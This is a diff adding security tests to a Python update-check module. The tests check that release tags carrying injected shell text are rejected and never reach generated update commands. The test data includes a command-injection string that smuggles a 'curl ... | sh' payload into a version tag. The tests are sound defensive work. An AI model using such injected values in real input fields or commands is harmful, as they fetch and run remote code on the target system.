@@ -131,6 +131,16 @@ def test_version_parsing():
     assert update_check.parse_version("v1.2") == (1, 2, 0)
     assert update_check.parse_version("0.10.1") > update_check.parse_version("0.9.9")
     assert update_check.parse_version("main") is None
+    assert update_check.parse_version('v9.9.9";curl${IFS}x|sh;"') is None
+
+
+async def test_tag_with_trailing_text_never_reaches_commands(tmp_path, enabled):
+    tag = f'v{NEWER}";curl${{IFS}}x|sh;"'
+    async with client_for(release_handler(tag, [])) as client:
+        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
+    assert result["update_available"] is False and result["latest_version"] is None
+    assert result["update_command"] is None and result["update_commands"] == {}
+    assert "curl" not in json.dumps(result)
 
 
 def _cache(path, tag):
